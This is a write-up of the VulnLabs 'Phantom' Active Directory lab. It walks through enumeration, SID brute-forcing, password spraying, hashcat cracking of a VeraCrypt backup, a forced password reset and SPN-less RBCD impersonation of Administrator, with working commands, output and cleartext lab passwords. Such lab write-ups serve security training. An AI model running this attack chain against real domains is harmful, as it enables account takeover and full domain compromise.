---
title: "Phantom.vl — VulnLabs Writeup"
date: 2025-07-20 12:00:00 +0000
categories: [Writeups, VulnLabs]
tags: [Windows, Active Directory, RBCD, Veracrypt]
image:
  path: /assets/img/posts/phantom_banner.png
---

![image.png](/assets/img/image.png)

# Scope Details

- Stand-Alone Machine
- Windows : AD
- Target : **10.10.123.229**

# Enumeration

## Nmap Scan —

```jsx
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-07-20 16:29:41Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: phantom.vl0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.phantom.vl
| Issuer: commonName=DC.phantom.vl
 rdp-ntlm-info:
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-07-20T16:30:36+00:00
|_ssl-date: 2025-07-20T16:31:16+00:00; -8s from scanner time.
5357/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 27068/tcp): CLEAN (Timeout)
|   Check 2 (port 26919/tcp): CLEAN (Timeout)
|   Check 3 (port 11133/udp): CLEAN (Timeout)
|   Check 4 (port 39546/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -8s, deviation: 0s, median: -8s
| smb2-time:
|   date: 2025-07-20T16:30:40
|_  start_date: N/A
```

## smb enumeration

To-Do List:

- [x]  anonymous listing of shares
- [x]  enumerate ‘guest’ shares
    - [x]  view readable contents
    - [x]  enumerate contents

## Found Loot

1. We found and email and new users:

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# cat tech_support_email.eml
Content-Type: multipart/mixed; boundary="===============6932979162079994354=="
MIME-Version: 1.0
From: alucas@phantom.vl
To: techsupport@phantom.vl
Date: Sat, 06 Jul 2024 12:02:39 -0000
Subject: New Welcome Email Template for New Employees

--===============6932979162079994354==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit

Dear Tech Support Team,

I have finished the new welcome email template for onboarding new employees.

Please find attached the example template. Kindly start using this template for all new employees.

Best regards,
Anthony Lucas
```

new users:

```jsx
techsupport@phantom.vl
alucas@phantom.vl
```

1. Found a Password!

We end up finding a base64-encoded pdf template. According to the email, there is a new welcome email template for onboarding new employees. 

So we decode it and find a password. 

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# echo 'JVBERi0xLjcKJcOkw7zDtsOfCjIgMCBvYmoKPDwvTGVuZ3RoIDMgMCBSL0ZpbHRlci9GbGF0ZURl
Y29kZT4+CnN0cmVhbQp4nI1Vy4rcMBC8+yt0zsFTXZYsGcyAJY8hgT0sGcgh5LBksyE5LGRYyO+H
bnsfM7OeyckvSdVV1dVGLe5vtRkOT78e7r4/uXxTqj8ODjWYXCtSd1Fc7Obr4Uf15YN7rHY3pdp8
frp7vL873Pf95qZ8HB222zwuux3c4WeV91Vo6+SioPbB7e/dZhIndPuHrz1kK7EH0cAjoAURkRAQ
...
...
...
U2l6ZSAyNy9Sb290IDI1IDAgUgovSW5mbyAyNiAwIFIKL0lEIFsgPEM0QUQ2NUU5NEZCOTk3OTYx
MTU1Q0FGRkQ2QUMyQjUzPgo8QzRBRDY1RTk0RkI5OTc5NjExNTVDQUZGRDZBQzJCNTM+IF0KL0Rv
Y0NoZWNrc3VtIC8wQTM4N0RBQjYxNTBCMkRCMTg0MzJGMDJENzY2MDQxMwo+PgpzdGFydHhyZWYK
OTQxNAolJUVPRgo=' | base64 -d >> welcome_template.pdf

```

![image.png](/assets/img/image%201.png)

## Listing Usernames

So, we don’t know what other users are there. We can test this password to see if it is still configured for the two users we currently have, however, the template specifies to change the password immediately after first login. 

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# nxc smb dc.phantom.vl -u alucas -p 'Ph...t!' --shares
SMB         10.10.123.229   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.123.229   445    DC               [-] phantom.vl\alucas:Ph.......rt! STATUS_LOGON_FAILURE

```

## Username enumeration

Tried to login to rpc via `rpcclient` to enumerate potential users. 

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# rpcclient dc.phantom.vl
Password for [WORKGROUP\root]:
Bad SMB2 (sign_algo_id=2) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] C6 45 2B A9 AD 14 5A 6D   C2 C7 D1 42 21 52 FF 22   .E+...Zm ...B!R."
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# rpcclient dc.phantom.vl -U guest
Password for [WORKGROUP\guest]:
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $>
```

Tried enumeration port 88 

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='phantom.vl'" 10.10.123.229
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 13:08 EDT
Nmap scan report for DC.phantom.vl (10.10.123.229)
Host is up (0.12s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users:
| Discovered Kerberos principals
|     guest@phantom.vl
|_    administrator@phantom.vl

Nmap done: 1 IP address (1 host up) scanned in 0.98 seconds
```

Nothing here

### Enumerating User SIDs

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# impacket-lookupsid guest@dc.phantom.vl
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Password:
[*] Brute forcing SIDs at dc.phantom.vl
[*] StringBinding ncacn_np:dc.phantom.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4029599044-1972224926-2225194048
498: PHANTOM\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: PHANTOM\Administrator (SidTypeUser)
501: PHANTOM\Guest (SidTypeUser)
502: PHANTOM\krbtgt (SidTypeUser)
512: PHANTOM\Domain Admins (SidTypeGroup)
513: PHANTOM\Domain Users (SidTypeGroup)
514: PHANTOM\Domain Guests (SidTypeGroup)
515: PHANTOM\Domain Computers (SidTypeGroup)
516: PHANTOM\Domain Controllers (SidTypeGroup)
517: PHANTOM\Cert Publishers (SidTypeAlias)
518: PHANTOM\Schema Admins (SidTypeGroup)
519: PHANTOM\Enterprise Admins (SidTypeGroup)
520: PHANTOM\Group Policy Creator Owners (SidTypeGroup)
521: PHANTOM\Read-only Domain Controllers (SidTypeGroup)
522: PHANTOM\Cloneable Domain Controllers (SidTypeGroup)
525: PHANTOM\Protected Users (SidTypeGroup)
526: PHANTOM\Key Admins (SidTypeGroup)
527: PHANTOM\Enterprise Key Admins (SidTypeGroup)
553: PHANTOM\RAS and IAS Servers (SidTypeAlias)
571: PHANTOM\Allowed RODC Password Replication Group (SidTypeAlias)
572: PHANTOM\Denied RODC Password Replication Group (SidTypeAlias)
1000: PHANTOM\DC$ (SidTypeUser)
1101: PHANTOM\DnsAdmins (SidTypeAlias)
1102: PHANTOM\DnsUpdateProxy (SidTypeGroup)
1103: PHANTOM\svc_sspr (SidTypeUser)
1104: PHANTOM\TechSupports (SidTypeGroup)
1105: PHANTOM\Server Admins (SidTypeGroup)
1106: PHANTOM\ICT Security (SidTypeGroup)
1107: PHANTOM\DevOps (SidTypeGroup)
1108: PHANTOM\Accountants (SidTypeGroup)
1109: PHANTOM\FinManagers (SidTypeGroup)
1110: PHANTOM\EmployeeRelations (SidTypeGroup)
1111: PHANTOM\HRManagers (SidTypeGroup)
1112: PHANTOM\rnichols (SidTypeUser)
1113: PHANTOM\pharrison (SidTypeUser)
1114: PHANTOM\wsilva (SidTypeUser)
1115: PHANTOM\elynch (SidTypeUser)
1116: PHANTOM\nhamilton (SidTypeUser)
1117: PHANTOM\lstanley (SidTypeUser)
1118: PHANTOM\bbarnes (SidTypeUser)
1119: PHANTOM\cjones (SidTypeUser)
1120: PHANTOM\agarcia (SidTypeUser)
1121: PHANTOM\ppayne (SidTypeUser)
1122: PHANTOM\ibryant (SidTypeUser)
1123: PHANTOM\ssteward (SidTypeUser)
1124: PHANTOM\wstewart (SidTypeUser)
1125: PHANTOM\vhoward (SidTypeUser)
1126: PHANTOM\crose (SidTypeUser)
1127: PHANTOM\twright (SidTypeUser)
1128: PHANTOM\fhanson (SidTypeUser)
1129: PHANTOM\cferguson (SidTypeUser)
1130: PHANTOM\alucas (SidTypeUser)
1131: PHANTOM\ebryant (SidTypeUser)
1132: PHANTOM\vlynch (SidTypeUser)
1133: PHANTOM\ghall (SidTypeUser)
1134: PHANTOM\ssimpson (SidTypeUser)
1135: PHANTOM\ccooper (SidTypeUser)
1136: PHANTOM\vcunningham (SidTypeUser)
1137: PHANTOM\SSPR Service (SidTypeGroup)
```

We are successful. We need to pipe this list into a file and fix the formatting for a potential credential dump.

## Username Spray Success

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# nxc smb dc.phantom.vl -u users.txt -p 'Ph.....t!' --continue-on-success
```

```jsx
SMB         10.10.123.229   445    DC               [+] 1122: PHANTOM\ibryant:P......4rt!
```

## Enumerate smb via `ibryant`

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# nxc smb dc.phantom.vl -u ibryant -p 'Ph.......t!' --shares
SMB         10.10.100.51    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.100.51    445    DC               [+] phantom.vl\ibryant:Ph4nt0m@5t4rt!
SMB         10.10.100.51    445    DC               [*] Enumerated shares
SMB         10.10.100.51    445    DC               Share           Permissions     Remark
SMB         10.10.100.51    445    DC               -----           -----------     ------
SMB         10.10.100.51    445    DC               ADMIN$                          Remote Admin
SMB         10.10.100.51    445    DC               C$                              Default share
SMB         10.10.100.51    445    DC               Departments Share READ
SMB         10.10.100.51    445    DC               IPC$            READ            Remote IPC
SMB         10.10.100.51    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.100.51    445    DC               Public          READ
SMB         10.10.100.51    445    DC               SYSVOL          READ            Logon server share
```

We find out `ibryant` has read permissions for share ‘Departments Share’

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl/HR]
└─# smbclient \\\\dc.phantom.vl\\'Departments Share' -U ibryant

Password for [WORKGROUP\ibryant]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul  6 12:25:31 2024
  ..                                DHS        0  Sun Jul  7 04:39:30 2024
  Finance                             D        0  Sat Jul  6 12:25:11 2024
  HR                                  D        0  Sat Jul  6 12:21:31 2024
  IT                                  D        0  Thu Jul 11 10:59:02 2024
```

```jsx
smb: \IT\> ls
  .                                   D        0  Thu Jul 11 10:59:02 2024
  ..                                  D        0  Sat Jul  6 12:25:31 2024
  Backup                              D        0  Sat Jul  6 14:04:34 2024
  mRemoteNG-Installer-1.76.20.24615.msi      A 43593728  Sat Jul  6 12:14:26 2024
  TeamViewerQS_x64.exe                A 32498992  Sat Jul  6 12:26:59 2024
  TeamViewer_Setup_x64.exe            A 80383920  Sat Jul  6 12:27:15 2024
  veracrypt-1.26.7-Ubuntu-22.04-amd64.deb      A  9201076  Sun Oct  1 16:30:37 2023
  Wireshark-4.2.5-x64.exe             A 86489296  Sat Jul  6 12:14:08 2024

	        6127103 blocks of size 4096. 1233172 blocks available
```

we find a backup directory with an `.hc` file inside

we find a few executables as well. 

## Veracrypt Password file cracking

`.hc` is a veracrypt encrypted file. We can crack this using hashcat and generating our own wordlist.

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# crunch 12 12 -t 'Phantom202%^' -o wordlist.txt
Crunch will now generate the following amount of data: 4290 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 330

crunch: 100% completed generating output

┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# hashcat -m 13721 IT_BACKUP_201123.hc wordlist.txt --force
hashcat (v6.2.6) starting

IT_BACKUP_201123.hc:Phantom2023!
```

This is the `Veracrypt` password to get into the backup volume drive using the application.

# Veracrypt Application : Mounting drive

We launched the veracrypt application, and mounted the backup drive we found. 

we were able to get our hands on a lot of loot. However, we found new credentials for `tlaney`

```jsx
vpn {
    sstp {
        authentication {
            local-users {
                username lstanley {
                    password "g.........c"
                }
            }
            mode "local"
```

A little weird that this didnt work. I’m assuming that this is not a valid smb login, however, it does say vpn authentication. We can try running this password with a new cred dump attempt with the list of users we have to see if `lstanley` is using another account. 

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# nxc smb dc.phantom.vl -u 'lstanley' -p 'g.........c'
SMB         10.10.100.51    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.100.51    445    DC               [-] phantom.vl\lstanley:gB6XTcqVP5MlP7Rc STATUS_LOGON_FAILURE
```

# Password Spray for other logins

We run a password spray against our list of users with the new password. And we are successful!

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# nxc smb dc.phantom.vl -u users.txt -p 'g..........c' --continue-on-success
```

![image.png](/assets/img/image%202.png)

# Initial Compromise

![image.png](/assets/img/image%203.png)

![image.png](/assets/img/image%204.png)

# Post Compromise

## BloodHound Analysis

We find out that the service account we currently have control over, currently has ‘**forceChangePassword**’ outbound rights over a user `wsilva`

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl/bloodhound]
└─# net rpc password "wsilva" 'Bermuda123!' -U "phantom.vl"/"svc_sspr"%"g.............c" -S dc.phantom.vl

┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl/bloodhound]
└─# nxc smb dc.phantom.vl -u wsilva -p 'Bermuda123!'
SMB         10.10.114.229   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
SMB         10.10.114.229   445    DC               [+] phantom.vl\wsilva:Bermuda123!
```

We change the user’s password to : Bermuda123!

We find out `wsilva` has the ‘**addAllowedToAct**’ delegation right to the domain controller. We now need to configure the target object so that the attacker-controlled computer can delegate to it. 

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl/bloodhound]
└─# impacket-rbcd -delegate-from 'wsilva' -delegate-to 'dc.phantom.vl' -dc-ip 10.10.114.229 -action 'write' 'phantom.vl'/'wsilva':'Bermuda123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] User not found in LDAP: dc.phantom.vl
[-] Account to modify does not exist! (forgot "$" for a computer account? wrong domain?)

┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl/bloodhound]
└─# impacket-rbcd -delegate-from 'WSILVA' -delegate-to 'DC$' -dc-ip 10.10.114.229 -action 'write' 'phantom.vl'/'wsilva':'Bermuda123!'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] WSILVA can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)
```

## Performing Resource based Delegation with a domain user

To abuse RBCD, we need to know the status of the machine quota in order to create a machine account and then add it to DC’s property but the quota is set to 0

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl/bloodhound]
└─# nxc ldap dc.phantom.vl -u 'wsilva' -p 'Bermuda123!' -M maq
SMB         10.10.114.229   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:phantom.vl) (signing:True) (SMBv1:False)
LDAP        10.10.114.229   389    DC               [+] phantom.vl\wsilva:Bermuda123!
MAQ         10.10.114.229   389    DC               [*] Getting the MachineAccountQuota
MAQ         10.10.114.229   389    DC               MachineAccountQuota: 0
```

Machine Account Quota is set to **0**

Unfortunate since we can’t get our hands on an SPN

## Hacktricks Blog: RBCD on SPNless Users

![image.png](/assets/img/image%205.png)

We obtain `wsilva` ’s TGT and the TGT session key

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl/bloodhound]
└─# impacket-getTGT -hashes :$(pypykatz crypto nt 'Bermuda123!') 'phantom.vl'/'WSILVA' -dc-ip 10.10.114.229
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in WSILVA.ccache

```

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# impacket-describeTicket 'WSILVA.ccache' | grep 'Ticket Session Key'
[*] Ticket Session Key            : 9........8
```

Replace the TGT session key with the domain user’s NTHash

```jsx
┌──(venv)─(root㉿BermudaDark)-[/home/cthulhu/autorecon/venv/bin]
└─# python3 smbpasswd.py -newhashes :9.........8 'phantom.vl'/'WSILVA':'Bermuda123!'@dc.phantom.vl
/home/cthulhu/autorecon/venv/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] NTLM hashes were changed successfully.
```

with S4U2Self and U2U, with `wsilva` we can obtain a service ticket to itself on behalf of the admin and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to.

```jsx
┌──(root㉿BermudaDark)-[/home/cthulhu/vulnlabs/phantom.vl]
└─# KRB5CCNAME=./WSILVA.ccache impacket-getST -u2u -impersonate "Administrator" -spn "host/dc.phantom.vl" -k -no-pass phantom.vl/WSILVA -dc-ip 10.10.114.229
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Impersonating Administrator
[*] Requesting S4U2self+U2U
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@host_dc.phantom.vl@PHANTOM.VL.ccache
```

# Machine Pwn3d!

![image.png](/assets/img/image%206.png)
